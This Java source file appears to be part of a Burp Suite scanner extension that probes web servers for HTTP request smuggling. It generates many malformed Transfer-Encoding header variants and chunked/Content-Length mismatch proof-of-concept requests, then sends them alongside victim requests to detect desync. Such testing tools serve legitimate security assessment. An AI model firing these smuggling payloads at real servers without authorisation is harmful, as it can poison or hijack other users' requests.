package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public abstract class SmuggleScanBox extends Scan {

    HashSet<String> supportedPermutations;
    static final String PERMUTE_PREFIX = "permute: ";

    SmuggleScanBox(String name) {
        super(name);
        supportedPermutations = new HashSet<>();
        registerPermutation("vanilla");
        registerPermutation("underjoin1");
        registerPermutation("spacejoin1");
        registerPermutation("underscore2");
        registerPermutation("space1");
        registerPermutation("space2");
        registerPermutation("nameprefix1");
        registerPermutation("valueprefix1");
        registerPermutation("nospace1");
        registerPermutation("tabprefix1");
        registerPermutation("vertprefix1");
        registerPermutation("commaCow");
        registerPermutation("cowComma");
        registerPermutation("contentEnc");
        registerPermutation("linewrapped1");
        registerPermutation("gareth1");
        registerPermutation("quoted");
        registerPermutation("aposed");
        registerPermutation("badwrap");
        registerPermutation("badsetupCR");
        registerPermutation("badsetupLF");
        registerPermutation("vertwrap");
        registerPermutation("tabwrap");

        for(int i: getSpecialChars()) {
            registerPermutation("prefix1:"+i);
        }


        Utilities.globalSettings.registerSetting("convert GET to POST", true);
        Utilities.globalSettings.registerSetting("report dodgy findings", false);
    }

    byte[] setupRequest(byte[] baseReq) {
        if (baseReq[0] == 'G') {
            if (Utilities.globalSettings.getBoolean("convert GET to POST")) {
                baseReq = Utilities.helpers.toggleRequestMethod(baseReq);
            }
            else {
                baseReq = Utilities.addOrReplaceHeader(baseReq, "Content-Type", "application/x-www-form-urlencoded");
                baseReq = Utilities.addOrReplaceHeader(baseReq, "Content-Length", "0");
            }
        }

        return baseReq;
    }

    @Override
    protected List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        HashMap<String, Boolean> config;

        // shortcut permutations if the vanilla approach works
        if (Utilities.globalSettings.getBoolean(PERMUTE_PREFIX+"vanilla")) {
            config = new HashMap<>();
            config.put("vanilla", true);
            if (doConfiguredScan(baseReq, service, config)) {
                BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
                return null;
            }
        }

        for (String permutation: supportedPermutations) {
            if (!Utilities.globalSettings.getBoolean(PERMUTE_PREFIX+permutation)) {
                continue;
            }

            String key = permutation+service.getProtocol()+service.getHost();
            if (Utilities.globalSettings.getBoolean("avoid rescanning vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(key)) {
                continue;
            }

            config = new HashMap<>();
            config.put(permutation, true);
            boolean worked = doConfiguredScan(baseReq, service, config);
            if (worked) {
                BurpExtender.hostsToSkip.putIfAbsent(key, true);
            }
        }
        return null;
    }

    abstract boolean doConfiguredScan(byte[] baseReq, IHttpService service, HashMap<String, Boolean> config);

    void registerPermutation(String permutation) {
        supportedPermutations.add(permutation);
        Utilities.globalSettings.registerSetting(PERMUTE_PREFIX+permutation, true);
    }


    boolean sendPoc(String name, byte[] setupAttack, byte[] victim, IHttpService service) {
        return sendPoc(name, Utilities.helpers.bytesToString(setupAttack), victim, service, new HashMap<>());
    }

    boolean sendPoc(String name, byte[] setupAttack, byte[] victim, IHttpService service, HashMap<String, Boolean> config) {
        return sendPoc(name, Utilities.helpers.bytesToString(setupAttack), victim, service, config);
    }


    boolean sendPoc(String name, String setupAttack, byte[] victim, IHttpService service, HashMap<String, Boolean> config) {
        try {
            Resp baseline = request(service, victim);
            SmuggleHelper helper = new SmuggleHelper(service);
            helper.queue(setupAttack);
            helper.queue(Utilities.helpers.bytesToString(victim));
            helper.queue(Utilities.helpers.bytesToString(victim));

            List<Resp> results = helper.waitFor();
            Resp cleanup = null;
            for (int i=0;i<3;i++) {
                cleanup = request(service, victim);
                if (cleanup.getInfo().getStatusCode() != baseline.getInfo().getStatusCode()) {
                    request(service, victim);
                    break;
                }
            }
            short cleanupStatus = cleanup.getStatus();
            short minerStatus = results.get(0).getStatus();
            short victimStatus = results.get(1).getStatus();

            if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
                return false;
            }

            String issueTitle;
            String issueDescription = "";

            if (cleanupStatus == minerStatus) {
                if (victimStatus == 0) {
                    issueTitle = "Null victim";
                }
                else {
                    issueTitle = "Req smuggling attack (legit)";
                }
            } else if (minerStatus == victimStatus) {
                issueTitle = "Req smuggling attack (XCON)";
            } else if (cleanupStatus == victimStatus) {
                issueTitle = "Attack timeout";
            } else {
                issueTitle = "Req smuggling attack (hazardous)";
            }


            helper = new SmuggleHelper(service);
            final int randomCheckCount = 7;
            for (int i=0; i<randomCheckCount;i++) {
                helper.queue(Utilities.helpers.bytesToString(victim));
            }
            List<Resp> cleanResults = helper.waitFor();
            for (int i=1; i<randomCheckCount;i++) {
                if (cleanResults.get(i-1).getStatus() != cleanResults.get(i).getStatus()) {
                    if (!Utilities.globalSettings.getBoolean("report dodgy findings")) {
                        return false;
                    }
                    issueTitle += " (dodgy)";
                    break;
                }
            }

            issueTitle += ": "+name + " -";

            issueTitle += String.join("|", config.keySet());

            report(issueTitle, issueDescription, cleanup, results.get(0), results.get(1));

            BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
            return true;
        }
        catch (Exception e) {
            return false;
        }
    }

    static ArrayList<Integer> getSpecialChars() {
        ArrayList<Integer> chars = new ArrayList<>();
//        for (int i=0;i<32;i++) {
//            chars.add(i);
//        }
//        chars.add(127);
        chars.add(9);
        chars.add(11);
        chars.add(12);
        chars.add(13);
        return chars;
    }

    boolean leftAlive(byte[] req, IHttpService service) {
        byte[] keepalive = Utilities.setHeader(req, "Connection", "keep-alive");
        Resp resp = request(service, keepalive);
        String connectionType = Utilities.getHeader(resp.getReq().getResponse(), "Connection");
        return connectionType.toLowerCase().contains("alive");

    }

    static Resp buildPoc(byte[] req, IHttpService service, HashMap<String, Boolean> config) {
        try {
            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0, config);

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            buf.write(badMethodIfChunked);
            buf.write("G".getBytes());

            // first request ends here
            buf.write(makeChunked(req, 0, 0, config));
            return new Resp(new Req(buf.toByteArray(), null, service));
        }
        catch (IOException e) {
            throw new RuntimeException();
        }
    }

    static byte[] gzipBody(byte[] baseReq) {
        try {
            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
            String body = Utilities.getBody(req);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPOutputStream gzip = new GZIPOutputStream(out);
            gzip.write(Utilities.helpers.stringToBytes(body));
            gzip.close();
            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
        } catch (Exception e) {
            Utilities.err(e.getMessage());
            return baseReq;
        }
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
        return makeChunked(baseReq, contentLengthOffset, chunkOffset, new HashMap<>());
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset, HashMap<String, Boolean> settings) {
        if (!Utilities.containsBytes(baseReq, "Transfer-Encoding".getBytes())) {
            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "foo");
        }

        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");


        if (settings.containsKey("underjoin1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer_Encoding".getBytes());
        } else if (settings.containsKey("spacejoin1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer Encoding".getBytes());
        }
        else if (settings.containsKey("space1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer-Encoding ".getBytes());
        }
        else if (settings.containsKey("nameprefix1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), " Transfer-Encoding".getBytes());
        }
        else if (settings.containsKey("valueprefix1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:  ".getBytes());
        }
        else if (settings.containsKey("nospace1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:".getBytes());
        }
        else if (settings.containsKey("tabprefix1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\t".getBytes());
        }
        else if (settings.containsKey("commaCow")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: chunked, cow".getBytes());
        }
        else if (settings.containsKey("cowComma")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: cow, ".getBytes());
        }
        else if (settings.containsKey("contentEnc")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Content-Encoding: ".getBytes());
        }  else if (settings.containsKey("vertprefix1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\u000B".getBytes());
        } else if (settings.containsKey("linewrapped1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\n ".getBytes());
        } else if (settings.containsKey("gareth1")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding\n : ".getBytes());
        } else if (settings.containsKey("quoted")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: \"chunked\"".getBytes());
        } else if (settings.containsKey("aposed")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: 'chunked'".getBytes());
        } else if (settings.containsKey("badwrap")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\n Transfer-Encoding: chunked\r\n".getBytes());
        } else if (settings.containsKey("badsetupCR")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\nFooz: bar\rTransfer-Encoding: chunked\r\n".getBytes());
        } else if (settings.containsKey("badsetupLF")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\nFooz: bar\nTransfer-Encoding: chunked\r\n".getBytes());
        } else if (settings.containsKey("vertwrap")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: \n\u000B".getBytes());
        } else if (settings.containsKey("tabwrap")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: \n\t".getBytes());
        }

        for (int i: getSpecialChars()) {
            if (settings.containsKey("prefix1:"+i)) {
                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), ("Transfer-Encoding:"+(char) i).getBytes());
            }
        }

        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
        String body = Utilities.getBody(baseReq);
        int chunkSize = bodySize+chunkOffset;
        if (chunkSize > 0) {
            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
        }
        else {
            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
        }
        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
        String newContentLength = Integer.toString(bodySize+contentLengthOffset);
        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);

        // fixme breaks stuff
//        if (settings.containsKey("underscore2")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Content-Length".getBytes(), "Content_Length".getBytes());
//        }
//        else if (settings.containsKey("space2")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Content-Length".getBytes(), "Content-Length ".getBytes());
//        }

        return chunkedReq;
    }
}
